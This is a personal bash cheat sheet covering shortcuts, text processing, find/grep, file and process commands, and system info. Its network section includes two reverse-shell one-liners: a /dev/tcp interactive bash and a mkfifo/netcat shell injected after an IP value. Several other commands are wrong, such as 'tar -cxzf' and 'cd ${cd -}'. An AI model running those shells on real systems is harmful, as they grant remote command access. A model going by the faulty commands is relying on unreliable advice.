# Bash Navigation

* `Ctrl A`: Move to the beginning of the command
* `Ctrl E`: Move to the end of the command
* `Alt F`: Move forward one word in command line 
* `Alt B`: Move backward one word in command line 

* Clear from cursor to the beginning of a line
```bash
CTRL + u
```

* Clear from cursor to the end of a line
```bash
CTRL + k
```

* Clears one character to the right of cursor (WARNING: will close the current session when the command line is empty!)
```bash
CTRL + d
```

* Clears one word to the left of the cursor
```bash
ESC + Backspace
```

* Clears one word to the right of the cursor
```bash
ESC + d
```
## Reverse Search
* `Ctrl R`: Start reverse search
* `Ctrl R`: Once started, will bring you to the next recent match
* `Ctrl G`: Quits reverse search, and preserve the command already typed

# Network commands
* nmap -A: Aggressive mode
```bash
nmap -A IP
```
* Interactive bash shell
```bash
/bin/bash -i > /dev/tcp/IP/PORT 0<&1 2>&1
```

* Another way to get reverse shell with command execution
```bash
192.168.0.18; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc -lp 9999 > /tmp/f
```

* Scanning all services given a server with `nmap`
```bash
nmap -A 192.168.0.1
```

* Show possible mount point given a server that is running NFS
```bash
showmount -e 192.168.0.1
```

# String Manipulation

* `awk` with print. prints first field.
```bash
echo "Hello World" | awk '{print $1}'
```

* `echo` with `-e` interpretation of back slashes
```bash
echo -e "Hello \n World"
```

* `cut` (returns Hello) `-d`: deliminator, `-f`: field (fields are indexed from 1)
```bash
echo "Hello World" | cut -d ' ' -f 1
```

* `awk`, prints the rest of the argument. `$1` the first word, `$0` is the entire line.
```bash
awk '{$1 = ""; print $0;}'
```


* `tr`: translates and/or deletes chars from `stdin`, and writes to `stdout`. `-d`: deletes all occurrence, `-s`: make repeated sequential characters only appear once
```bash
tr [a-z] [A-Z] < lowercase.txt > uppercase.txt
cat file.txt | tr -d ' '
cat file.txt | tr -s '.'
```

* `cut` with tabs; `cut` by default split by tabs...
```bash
cat FILE | cut -d $'\t' -f 2
```
```
cat FILE | cut -f 2
```

* Print out the content of a file at `LINE` number `-n` in sed is quiet, `p`: print
```bash
awk 'NR=LINE{print}' FILE
sed -n -e LINEp FILE
sed -n LINEp FILE
sed -n 'LINE{p;q}' FILE
```

* Print out a range of line of a file
```bash
sed -n -e '100,110 p' FILE
sed -n 100,110p FILE
```

# Search Manipulation

* AWESOME `grep` FLAG, `-A NUM`, print `NUM` lines of trailing context after matching line
```bash
grep VGA -A 12
```

* `grep` Search a string in current directory. `-w` stand for whole word, `-r` recursive
```bash
grep -rnw . -e "STRING"
```

*  `grep`:  `-i` ignore case, `-l` output filename that match, `-L` filename that doesn't match
```bash
grep -r --include '*.py' STRING .
```

* `find` all mp3 files in current directory and create a playlist. `\;` denotes the end of command
```bash
find . -maxdepth 1 -name "*.mp3" -exec echo "play" {} \; > playlist
```

* `find` all file with certain extension
```bash
find `pwd` -type f -name "*.txt"
```

* `grep` exclude a file of strings
```bash
grep -avf "FILE.txt"
```

* `xargs` usage, useful pipes, but require the flag `-print0`, `-I`: replaces occurrence of replace-str in the initial arguments with names read from stdin
```bash
find . -type f -name "*.mp3" -print0 | xargs -0 -I file cp file dir/
```
```
ls | grep mp3 | xargs -I file cp file dir/
ls | grep -avf "BLACKLIST" | xargs -I file COMMANDS file
```

* Print out the content of a file at LINE number; `-n`: quiet, `p`: print
```bash
awk 'NR=LINE{print}' FILE
sed -n -e LINEp FILE
sed -n LINEp FILE
sed -n 'LINE{p;q}' FILE
```

* Print out a range of line of a file
```bash
sed -n -e '100,110 p' FILE
sed -n 100,110p FILE
```

* Output the first `X` line of a file
```bash
sed 'X{p;q}' FILE
head -n X FILE
```

* Getting the exact number of line from the bottom or the top of a output (In this case, 2nd line from the bottom)
(WARNING: THIS ONLY WORK ONCE HAHA, )
```bash
history | grep clone | tail -n 2 | head -n 1
```

# File Manipulation

* Shuffles the lines of a file `-R`: random
```bash
sort -R playlist -o playlist
```

* Shuffles the fast way (ONLY WORKS with file that has run permission)
```bash
shuf FILE | tee FILE
```

* Convert Chinese unreadable filename to correct filename (AWESOME)
```bash
7z x -scs903 ZIPFILE.zip
```

* Insert a newline at a specific line with sed `-i` `[--in-place]`
```bash
sed -i '$LINE_NUMi \n' foo.txt 
```

* Read all files in a directory line by line (USE THE NEXT ONE if needed)
```bash
ls | while read f; do while read -r line; do echo $line; done < $f ; done
```

* Copy an entire directory to another directory; `-r` = `-R`
```bash
cp -R source dest
```

* Get the size of a directory with `du`, disk usage, `-s` (summary) `-h` human readable
```bash
du -sh 
```

* Get the size of free space with `df`, disk free, `-h` human readable in `1024` power, `-H` in `1000` power
```bash
df -h 
```

* Get details of a directory `-h` human readable, `-a` show hidden, `-l` print details, `-s` sort by date
```bash
ls -halt
```

* Save the output of a command to a variable
```bash
cwd=$(pwd)
```

* Run a process in the background using `&` (`-c` : create a new archive; `-x` : extract; `-z` : gunzip; `-f` : Specify a file)
```bash
tar -cxzf file.tar.gz . &
```

* Check current running processes
```bash
jobs
```
```
ps
```

* Retrieve the first word from stdout using `awk` and `cut`
```bash
echo "hello world" | awk '{print $1;}'
```
```
echo "hello world" | cut -f 1 -d " "
```

* Use nohup to enable a process to continue running in the background when a user exits shell (DETACH FULLY)
```bash
nohup tar -czf file.tar.gz &
```

* Does the above without creating nohup.out 
```bash
nohup COMMAND >/dev/null 2>&1 &
```

* Copy a file content to system clipboard
```bash
xclip -sel clip < FILE
```

* kill a process with `ps`
```bash
ps -eaf | grep vim
kill 1337
```
```
kill $(ps | grep play | awk '{print $1;}')
```

* kill a process with `pkill` (MUCH EASIER :D)
```bash
pkill vim
```

* kill a background process
```bash
jobs
kill %1
```

* Unzip a tarball
```bash
tar xf FILE.tar.xz
```

* Change directory to the output of a command
```bash
cd "$(dirname "$(which COMMAND)" )"
```

* Change directory to the previous directory!
```bash
cd ${cd -}
```
```
cd $OLDPWD
```

* Install .deb packages
```bash
dpkg -x file.deb
```

* Install / open `.rpm` files
```bash
sudo apt install rpm2cpio
rpm2cpio /path-to-file.rpm | cpio -i --make-directories
```

* `7z` is officially weird... the arguments it take have to be right afterwards...
```bash
7z x ZIP.zip -oEXTRACTED
```

* `grip`. Using grip to build markdown files locally. `-b`: opens up a browser tab. (Need to install a repo)
```bash
grip -b FILE.md
```

* Reading certain types of file line by line with `find`
```bash
for file in $(find . -type f -name "*.txt")
do
cat $file
done
```

## Redirection

`ls DIR > dirlist`
`>` Redirects output
`>>` Appends output to an existing file
`<` Takes in input
`>&` Redirects output of one file to another, e.g. `2>&1` redirects error to output (pre bash 4.0)
`&>>` does the above in post Bash 4.0 and apending it to a file
`&>` does the above but overwrites the target file


* Check architecture
```bash
dpkg --print-architecture
```

* Check OS version
```bash
lsb_release -a
```


* Getting the current directory name in a cool way, it can be VERY USEFUL!
```bash
basename $PWD
```

* List all the graphics card, `-nn` Show PCI vendor and device codes, `-v` verbose.
```bash
lspci -vnn | grep VGA -A 12
```
* Show CPU info
```bash
lscpu
```
* Show USB info, to determine the version of USB a flash drive is using, `-D` list devices.
```bash
lsusb
lsusb -D /dev/bus/usb/003/023
```

* Copy to a target directory and make the directory if it does not exist. `mkdir`, `-p` creates all directories
```
mkdir -p PATH && cp FILE PATH
```

* List of pip environments
```bash
pip freeze
```

* Install all pip environment recursively 
```bash
pip install -r requirements.txt
```


* List all the all current directories
```bash
ls -d */
echo */
ls -l | grep "^d"
ll | grep "^d"
for i in $(ls -d */); do echo ${i%%/}; done
```


